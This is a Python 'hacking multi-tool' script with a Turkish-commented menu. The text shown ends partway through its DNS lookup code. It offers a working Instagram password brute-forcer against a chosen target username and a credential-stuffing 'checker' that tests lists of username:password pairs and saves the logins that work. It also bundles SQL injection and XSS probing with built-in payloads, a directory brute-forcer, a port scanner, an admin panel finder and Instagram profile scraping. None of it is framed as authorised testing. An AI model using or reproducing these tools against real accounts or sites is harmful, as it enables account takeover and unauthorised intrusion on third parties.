#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Coded by      @charliecpln
# Discord:      @charliecpln
# Telegram:     @charliecpln
# Github:       @charliecpln

import os
import time
from sys import exit
import socket
from datetime import datetime
import webbrowser
import asyncio
import string
import random

# EKRANI TEMİZLEME FONKSİYONU VE KURULUM İŞLEMLERİ
try:
    def sil():
        name = os.name
        if name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    sil()

    def installation():
        try:
            print("Libraries checking...")
            from colorama import Fore, Back, Style, init
            import requests
            import instaloader
            from cryptography.fernet import Fernet
            import dns.resolver
            import aiohttp
            import discord
            from bs4 import BeautifulSoup
            import faker
            sil()
        
        except ImportError:
            print("Libraries are auto dowloading...")
            os.system("pip install colorama requests instaloader cryptography dnspython aiohttp discord beautifulsoup4 faker")
            sil()
    installation()

except Exception as e:
    print(f"An error occurred during installation: {e}\n")
    input("\nPress 'enter' to exit...\n")
    exit()

# KÜTÜPHANELERİN TEKRARDAN İÇE AKTARIMI
from colorama import Fore, Back, Style, init
import requests
import instaloader
from cryptography.fernet import Fernet
import dns.resolver
import aiohttp
import discord
from discord.ext import commands
from bs4 import BeautifulSoup
from faker import Faker

# COLORAMANIN BAŞLANGICI
init(autoreset=True)

banner = Style.BRIGHT + Fore.LIGHTRED_EX + """
██████╗██╗  ██╗ █████╗ ██████╗ ██╗     ██╗███████╗██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██║     ██║██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║     ███████║███████║██████╔╝██║     ██║█████╗  ███████║███████║██║     █████╔╝ 
██║     ██╔══██║██╔══██║██╔══██╗██║     ██║██╔══╝  ██╔══██║██╔══██║██║     ██╔═██╗ 
╚██████╗██║  ██║██║  ██║██║  ██║███████╗██║███████╗██║  ██║██║  ██║╚██████╗██║  ██╗
╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                            [github.com/charliecpln]                 @charliecpln👻
"""

# İNTERNET BAĞLANTISI TESTİ
def connectiontest():
    sil()
    print(Fore.LIGHTMAGENTA_EX + "Trying to connection 'github.com' for connection test...")
    try:
        response = requests.get("https://www.github.com")
        print(Fore.LIGHTGREEN_EX + "[+] Connection test successful")

    except:
        print(Fore.LIGHTRED_EX + "[-] You must be connected to the internet to use this script!")
        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
        exit()

connectiontest()

def instagram_brute_force():
    try:
        sil()
        from instaloader.exceptions import BadCredentialsException, TwoFactorAuthRequiredException, ConnectionException, LoginRequiredException
        print(banner)
        L = instaloader.Instaloader()

        username = input(Fore.LIGHTYELLOW_EX + Style.DIM + "[?] Please enter target username: ")
        password_file = input(Fore.LIGHTYELLOW_EX + Style.DIM + "[?] Please enter path of password file: ")
        print("\n")
        def sifreleri_dene():
            try:
                with open(password_file, "r") as dosya:
                    sifreler = dosya.readlines()    
            except FileNotFoundError:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[X] Error: {password_file} not found!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()
            
            for password in sifreler:
                password = password.strip()
                try:
                    L.login(username, password)
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Login successful! Username: {username} Password: {password}\nSaved as 'igbrute.txt'")
                    with open("igbrute.txt", "a", encoding="utf-8") as dosya:
                        dosya.write(f"[+] Username: {username}, Password: {password}\n")
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()

                except TwoFactorAuthRequiredException:
                    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"[/] 2FA detected! Username: {username} Password: {password}\nSaved as 'igbrute.txt'")
                    with open("igbrute.txt", "a", encoding="utf-8") as dosya:
                        dosya.write(f"[/] Username: {username}, Password: {password}\n")
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()

                except BadCredentialsException:
                    print(Fore.LIGHTRED_EX + f"[-] {username}:{password}")
                    continue

                except ConnectionError:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Connection error!")
                    continue

                except Exception as e:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[!] Error: {e}")
                    continue

        sifreleri_dene()
        input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
        return main()
    
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def instagram_checker():
    try:
        from instaloader.exceptions import BadCredentialsException, TwoFactorAuthRequiredException, ConnectionException, LoginRequiredException
        sil()
        print(banner)
        file_name = input(Fore.LIGHTYELLOW_EX + Style.DIM + "[?] Please enter the file path: ").strip()
        print("\n")

        try:
            with open(file_name, "r") as dosya:
                for line in dosya:
                    line = line.strip()
                    parts = line.split(":")

                    if len(parts) == 2:
                        username = parts[0]
                        password = parts[1]

                        # GİRİŞ YAPILACAK YER
                        try:
                            L = instaloader.Instaloader()
                            L.login(username, password)

                            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Login successful! Username: {username} Password: {password}\nSaved as 'igchecker.txt'")
                            with open("igchecker.txt", "a", encoding="utf-8") as output_file:
                                output_file.write(f"[+] Username: {username}, Password: {password}\n")
                        
                        except BadCredentialsException:
                            print(Fore.LIGHTRED_EX + f"[-] {username}:{password}")
                            continue

                        except TwoFactorAuthRequiredException:
                            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"[/] 2FA detected! Username: {username} Password: {password}\nSaved as 'igchecker.txt'")
                            with open("igbrute.txt", "a", encoding="utf-8") as dosya:
                                dosya.write(f"[/] Username: {username}, Password: {password}\n")
                            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                            return main()

                        except Exception as e:
                            print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[!] Error: {e}")
                            continue

                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()

        except FileNotFoundError:
            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[X] Error: {file_name} not found!")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
            return main()

        except Exception as e:
            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[X] Error: {e}")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
            return main()
        
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def instagram_osint():
    try:
        sil()
        print(banner)
        username = input(Fore.LIGHTYELLOW_EX + Style.DIM + "[?] Please enter a username: ").strip().lower()

        L = instaloader.Instaloader()

        try:
            profile = instaloader.Profile.from_username(L.context, username)

            print(Fore.LIGHTCYAN_EX + f"""
    Username: {profile.username}
    Full name: {profile.full_name}
    Bio: {profile.biography}
    Followers: {profile.followers}
    Following: {profile.followees}
    Posts: {profile.mediacount}
    Private: {profile.is_private}

    Profil picture: {profile.profile_pic_url}
    """)
            with open("instaosint.txt", "a", encoding="utf-8") as dosya:
                dosya.write(f"""
    Username: {profile.username}
    Full name: {profile.full_name}
    Bio: {profile.biography}
    Followers: {profile.followers}
    Following: {profile.followees}
    Posts: {profile.mediacount}
    Private: {profile.is_private}

    Profil picture: {profile.profile_pic_url}
    """)
            print(Fore.LIGHTGREEN_EX + f"Saved as 'instaosint.txt'")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
            return main()
        
        except instaloader.exceptions.ProfileNotExistsException:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Error: User {username} not found!")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
            return main()
        
        except Exception as e:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Error: {e}")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
            return main()
        
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def sifreleme_main():
    sil()

    def save_key(file_path):
        key = Fernet.generate_key()
        key_path = file_path + ".key"
        with open(key_path, "wb") as key_file:
            key_file.write(key)
        return key

    def encrypt_file():
        try:
            sil()
            print(banner)
            file_path_to_encrypt = input(Fore.LIGHTYELLOW_EX + Style.DIM + "Please enter your file path: ").strip()

            # ANAHTARIN KAYIT EDİLECĞEİ DOSYANIN KONUMUNU AYARLLAMA FONKSİYONU
            directory = os.path.dirname(file_path_to_encrypt)
            key_path = os.path.join(directory, os.path.basename(file_path_to_encrypt) + ".key")

            # ANAHTARI KAYIT ETME FONKSİYONU
            key = save_key(key_path)
            fernet = Fernet(key)

            # ŞİFRELENECK DOSYAYI OKUMA
            try:
                with open(file_path_to_encrypt, "rb") as dosya:
                    dosya_data = dosya.read()
                    encrypted_data = fernet.encrypt(dosya_data)

                with open(file_path_to_encrypt, "wb") as dosya:
                    dosya.write(encrypted_data)

                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] File encrypted successfully!")
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[?] Key saved as '{key_path}'")
                
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                sifreleme_main()

            except FileNotFoundError:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"File {file_path_to_encrypt} not found!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                sifreleme_main()

        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()

    def decrypt_file():
        try:
            sil()
            print(banner)
            file_path_to_decrypt = input(Fore.LIGHTYELLOW_EX + Style.DIM + "Please enter your encrypted file path: ").strip()
            key_path = file_path_to_decrypt + ".key"

            try:
                with open(key_path, "rb") as key_file:
                    key = key_file.read()
                
                fernet = Fernet(key)

                with open(file_path_to_decrypt, "rb") as dosya:
                    encrypted_data = dosya.read()
                    decrypted_data = fernet.decrypt(encrypted_data)

                with open(file_path_to_decrypt, "wb") as dosya:
                    dosya.write(decrypted_data)

                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] File decrypted successfully!")
                
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                sifreleme_main()
            
            except FileNotFoundError:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"File {file_path_to_decrypt} not found!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                sifreleme_main()

        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()

    print(banner)
    sifreleme_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
    [1] - Encrypt File
    [2] - Decrypt File
    [3] - Main Menu
    
    """
    print(sifreleme_menu)
    secim = input(Fore.LIGHTBLUE_EX + Style.DIM + "Please enter your choice: ").lower()

    if secim == "1" or secim.startswith("e"):
        encrypt_file()

    elif secim == "2" or secim.startswith("d"):
        decrypt_file()

    elif secim == "3" or secim.startswith("m"):
        return main()

    else:
        sil()
        sifreleme_main()

def sql_scanner():
    try:
        sil()
        print(banner)
        payloadlar = ["'", '"', "1 OR 1=1", "' OR '1'='1"]
        print(Back.LIGHTRED_EX + "[!] Leave blank if you don't have any payloads file\n")
        
        payload_dosyasi = input(Fore.LIGHTCYAN_EX + Style.DIM + "[*] Please enter path of payloads: ")
        targeturl = input(Fore.LIGHTCYAN_EX + Style.DIM + "[?] Please enter target url: ")

        if not targeturl.startswith("http"):
            if targeturl.startswith("www."):
                targeturl = "https://" + targeturl
            else:
                targeturl = "https://www." + targeturl

        if payload_dosyasi == "":
            payloadlar = payloadlar
        else:
            try:
                with open(payload_dosyasi, "r") as payload_dosyasi:
                    payloadlar = payload_dosyasi.readlines()
            except FileNotFoundError:
                print(Fore.LIGHTRED_EX + "[!] Payload file not found.")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()
            
        vulnerability_found = False
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json'
    }

        for payload in payloadlar:
            payload = payload.strip()
            try:
                response = requests.get(f"{targeturl}{payload}", headers=headers, timeout=15)
            except requests.exceptions.ConnectionError:
                print(Fore.LIGHTRED_EX + f"[!] Error: Connection error!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()
            except requests.exceptions.RequestException as req_err:
                print(Fore.LIGHTRED_EX + f"[!] General error occurred: {req_err}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()

            if "sql" in response.text.lower():
                print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"\n\n[+] SQL Injection vulnerability detected:\nUrl: {targeturl}\nPayload: {payload}\n")
                with open("sqlscanner.txt", "a", encoding="utf-8") as dosya:
                    dosya.write(f"Url: {targeturl}, Payload: {payload}\n")
                webbrowser.open(f"{targeturl}")
                vulnerability_found = True

                input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
                return main()

            if not vulnerability_found:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + "[!] No SQL Injection vulnerabilities found.")
                input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
                return main()
            
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def xss_scanner():
    try:
        sil()
        print(banner)
        default_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<body onload=alert('XSS')>",
            "'><img src=x onerror=alert(1)>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>"
        ]
        
        print(Back.LIGHTRED_EX + "[!] Leave blank if you want to use default payloads\n")
        payload_dosyasi = input(Fore.LIGHTCYAN_EX + Style.DIM + "[*] Please enter path of payloads: ")
        
        targeturl = input(Fore.LIGHTCYAN_EX + Style.DIM + "[?] Please enter target url: ")
        
        if not targeturl.startswith("http"):
            if targeturl.startswith("www."):
                targeturl = "https://" + targeturl
            else:
                targeturl = "https://www." + targeturl

        if payload_dosyasi == "":
            payloadlar = default_payloads
        else:
            try:
                with open(payload_dosyasi, "r") as payload_dosyasi:
                    payloadlar = payload_dosyasi.readlines()
                    payloadlar = [payload.strip() for payload in payloadlar]
            except FileNotFoundError:
                print(Fore.LIGHTRED_EX + "[!] Payload file not found.")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()
            
        vulnerability_found = False

        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json'
    }

        for payload in payloadlar:
            try:
                response = requests.get(f"{targeturl}?input={payload}", headers=headers, timeout=15)
            except requests.exceptions.ConnectionError:
                print(Fore.LIGHTRED_EX + f"[!] Error: Connection error!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()
            except requests.exceptions.RequestException as req_err:
                print(Fore.LIGHTRED_EX + f"[!] General error occurred: {req_err}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()

            if payload in response.text:
                print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"\n\n[+] XSS vulnerability detected:\nUrl: {targeturl}\nPayload: {payload}\n")
                with open("xssscanner.txt", "a", encoding="utf-8") as dosya:
                    dosya.write(f"Url: {targeturl}, Payload: {payload}\n")
                webbrowser.open(f"{targeturl}")
                vulnerability_found = True

                input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
                return main()

        if not vulnerability_found:
            print(Fore.LIGHTRED_EX + "[!] No XSS vulnerabilities found.")
            input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
            return main()
        
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def directory_scanner():
    try:
        sil()
        print(banner)
        directorys = []
        targeturl = input(Fore.LIGHTCYAN_EX + Style.DIM + "[*] Target URL: ")
        wordlist_file = input(Fore.LIGHTCYAN_EX + Style.DIM + "[?] Path of wordlist: ")

        if not targeturl.startswith("http"):
            if targeturl.startswith("www."):
                targeturl = "https://" + targeturl
            else:
                targeturl = "https://www." + targeturl

        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f"\n[?] Trying connecting to {targeturl}")
        
        try:
            requests.get(targeturl)
            print(Style.BRIGHT + Fore.GREEN + "[+] Connection successful")
        except Exception as e:
            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"Connection error!\n")
            input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
            return main()

        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + f"\n[?] Editing {wordlist_file}")

        try:
            with open(wordlist_file, "r+") as f:
                word = f.readlines()
                f.seek(0)
                f.truncate()

                for w in word:
                    w = w.strip()
                    if not w.startswith("/"):
                        f.write("/" + w + "\n")
                    else:
                        f.write(w + "\n")
            print(Style.BRIGHT + Fore.GREEN + "[+] Editing successful")

        except FileNotFoundError:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + "\n[!] File not found!")
            input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
            return main()
        
        with open(wordlist_file, "r") as f:
            wordlist = f.readlines()

        baslangiczamani = datetime.now()

        print(Style.BRIGHT + Fore.LIGHTBLUE_EX + f"[*] Starting scan...\n")

        foundeddirectory = 0
        notfoundeddirectory = 0
        totaldirectory = 0

        for w in wordlist:
            w = w.strip()
            fullurl = f"{targeturl}{w}"
            try:
                response = requests.get(fullurl)
            except Exception as e:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"Error: {e}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()
            if response.status_code == 200:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Directory found: {fullurl}")
                directorys.append(fullurl)
                foundeddirectory += 1
                totaldirectory += 1
                with open("directorys.txt", "a", encoding="utf-8") as dosya:
                    dosya.write(f"{fullurl}\n")
            else:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[-] Directory not found: {fullurl}")
                notfoundeddirectory += 1
                totaldirectory += 1

        bitiszamani = datetime.now()
        kalanzaman = bitiszamani - baslangiczamani

        # ÖZET
        print(Style.BRIGHT + Fore.LIGHTCYAN_EX  + f"\n            [RESULTS]           ")
        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f"\nTarget url: {targeturl}\nWordlist: {wordlist_file}")
        if not directorys:
            print(Style.DIM + Fore.LIGHTRED_EX + f"Directorys: Can't found any directorys")
        else:
            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"Founded: {foundeddirectory}\nNot founded: {notfoundeddirectory}\nTotal: {totaldirectory}")
        print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + f"Scanned in {kalanzaman.seconds // 60} minutes {kalanzaman.seconds % 60} seconds\n")
        
        input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
        return main()
    
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def port_scanner():
    try:
        print(banner)
        openports = []
        ipadres = input(Fore.LIGHTCYAN_EX + Style.DIM + "[*] Target IP address: ")
        try:
            baslangicport = int(input(Fore.LIGHTCYAN_EX + Style.DIM + "[?] Start port no: "))
            bitisport = int(input(Fore.LIGHTCYAN_EX + Style.DIM + "[?] End port no: "))
        except:
            print(Style.BRIGHT + Fore.LIGHTRED_EX + "[X] You can only enter integers!")
            input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
            return main()

        sil()
        print(banner)

        print(Fore.LIGHTYELLOW_EX + f"\n\nTarget IP: {ipadres}\nPort: {baslangicport} - {bitisport}\n\n")
        time.sleep(0.5)
        baslangiczamani = datetime.now()

        for port in range(baslangicport, bitisport + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ipadres, port))
            except Exception as e:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"Error: {e}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to exit...\n")
                return main()
            if result == 0:
                print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"[+] Open port: {port}")
                openports.append(port)
            else:
                print(Style.DIM + Fore.LIGHTRED_EX + f"[-] Closed port: {port}")
            sock.close()

        bitiszamani = datetime.now()
        kalanzaman = bitiszamani - baslangiczamani

        #ÖZET
        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f"\n\nTarget IP: {ipadres}\nPort: {baslangicport} - {bitisport}")

        if not openports:
            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"Open ports: No open ports")
        else:
            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"Open ports: {openports}")

        print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"Scanned in {kalanzaman.seconds // 60} minutes {kalanzaman.seconds % 60} seconds\n")

        time.sleep(1)
        input(Fore.LIGHTMAGENTA_EX + "Press 'enter' to continue...\n")
        return main()
    
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def admin_panel_finder():
    try:
        sil()
        print(banner)
        
        def url_sonu_kontrol_ve_ekle(url, path):
            if not path.startswith('/'):
                path = '/' + path
            return url.rstrip('/') + path
        
        import asyncio
        from colorama import Fore, Style, Back
        
        async def url_test_et_async(session, url, yollar):
            tasks = []
            denenen = 0
            basarili = 0
            basarisiz = 0
            hatali = 0
            yols = len(yollar)
            
            for yol in yollar:
                test_url = url_sonu_kontrol_ve_ekle(url, yol)
                tasks.append(test_url)
            
            results = await asyncio.gather(*[async_get(session, test_url) for test_url in tasks])
            
            for test_url, status in results:
                try:
                    if status == 200:
                        denenen += 1
                        basarili += 1
                        print(Fore.GREEN + f"[✓] {test_url} ({denenen}/{yols})")
                        with open("adminfinder.txt", "a") as dosya:
                            dosya.write(f"[✓] {test_url}\n")
                    else:
                        denenen += 1
                        basarisiz += 1
                        print(Fore.RED + f"[X] {test_url} ({denenen}/{yols})")
                except Exception as e:
                    hatali += 1
                    print(Fore.YELLOW + f"[!] An error occurred while testing {test_url}: {str(e)}")
            
            toplam = basarili + basarisiz
            print(Style.BRIGHT + Fore.CYAN + f"""
                        [ANALYSES]
                    
            Successful scans: {basarili}
            Failed scans: {basarisiz}
            Erroneous scans: {hatali}
            Total scans: {toplam}
            
            Summary: {basarili}/{toplam}
            """)
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
            return main()

        async def async_get(session, url):
            try:
                async with session.get(url) as response:
                    return url, response.status
            except aiohttp.ClientError as e:
                print(Back.RED + "[!]" + Back.RESET + f" {url} domain is incorrect")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return url, None
            except Exception as e:
                print(Fore.RED + f"Error: {e}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return url, None

        async def admin_panel_finder_main(urls, yollar):
            async with aiohttp.ClientSession() as session:
                tasks = [url_test_et_async(session, url, yollar) for url in urls]
                await asyncio.gather(*tasks)

        def yol_listesi_yukle():
            try:
                print(Fore.MAGENTA + "\nIf there is no special path list, leave it empty!\n")
                yol_dosyasi = input(Fore.YELLOW + "Special path list file:")
                sil()
                if yol_dosyasi.strip() == "":
                    return None
                with open(yol_dosyasi, "r") as dosya:
                    yollar = [yol.strip() for yol in dosya]
                print(Fore.CYAN + f"{len(yollar)} Loading quantity path...")
                print(Back.RED + f"[!] This process may take a while!\n")
                return yollar
            except FileNotFoundError:
                print(Fore.MAGENTA + "File not found. Default paths will be used.")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return None

        varsayilan_yollar = [
            '/phpmyadmin', '/wp-admin', '/cpanel', '/admin', '/webmail',
            '/adminer', '/plesk', '/git', '/user', '/setup',
            '/admin_login', '/administrator', '/admincp', '/dashboard',
            '/controlpanel', '/myadmin', '/siteadmin', '/superadmin',
            '/admin_area', '/site_admin', '/manage', '/console', '/backend',
            '/app/admin', '/portal/admin', '/admin_dashboard', '/site_control',
            '/adminpanel', '/control', '/settings', '/adminarea', '/management',
            '/sysadmin', '/panel', '/system', '/config',
            '/admin_settings', '/admin_tools', '/admin_access', '/admin_console',
            '/admin_interface', '/admin_zone', '/admin_home', '/admin_index',
            '/administration', '/admin_page', '/admin_section', '/admin_modules',
            '/admin_mgmt', '/webadmin', '/admin_main', '/admin_portal',
            '/admin_control', '/admin_options', '/admin_workspace', '/admin_homepage',
            '/admin_directory', '/admin_link', '/admin_manager', '/admin_host',
            '/admin_setup', '/admin_view', '/admin_service', '/server_admin',
            '/login', '/control_panel', '/user_admin', '/backend',
            '/site_control', '/admin_site', '/admin_view', '/admin_zone',
            '/mysqladmin', '/sqlbuddy', '/dbadmin', '/myadmin',
            '/webadmin', '/sqladmin', '/mysqlmanager', '/controlpanel',
            '/dashboard', '/manage', '/portal', '/console',
            '/site_control', '/system', '/settings', '/webmail'
        ]
        
        try:
            urltxt = input(Fore.YELLOW + "[?] Please enter the URL path: ").strip()
            try:
                with open(urltxt, "r") as dosya:
                    urllistesi = [url.strip() for url in dosya]
            except FileNotFoundError:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[X] File {urltxt} not found!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return main()

            except Exception as e:
                print(Fore.RED + f"Error: {e}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return main()
            
            yollar = yol_listesi_yukle() or varsayilan_yollar

            if not urllistesi:
                print(Fore.RED + "The URL list is empty.")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return main()
            elif not yollar:
                print(Fore.RED + "The path list is empty.")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
                return main()
            else:
                asyncio.run(admin_panel_finder_main(urllistesi, yollar))

        except Exception as e:
            print(Fore.RED + f"Error: {e}")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
            return main()
        
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def dns_query_main():
    
    def dns_query():
        try:
            sil()
            print(banner)
            domain = input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter target domain (google.com): ").strip().lower()
            print("\n")
            
            try:
                # IPv4 ve IPv6 sorgusu
                try:
                    ipv4 = dns.resolver.resolve(domain, "A")
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - IPv4: {[ip.to_text() for ip in ipv4]}")
                except dns.resolver.NoAnswer:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için IPv4 kaydı bulunamadı.")
                
                try:
                    ipv6 = dns.resolver.resolve(domain, "AAAA")
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - IPv6: {[ip.to_text() for ip in ipv6]}")
                except dns.resolver.NoAnswer:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için IPv6 kaydı bulunamadı.")

                # MX (Mail Exchange) sorgusu
                try:
                    mail = dns.resolver.resolve(domain, 'MX')
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - Mail: {[mx.to_text() for mx in mail]}")
                except dns.resolver.NoAnswer:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için MX kaydı bulunamadı.")
                
                # NS (Name Server) sorgusu
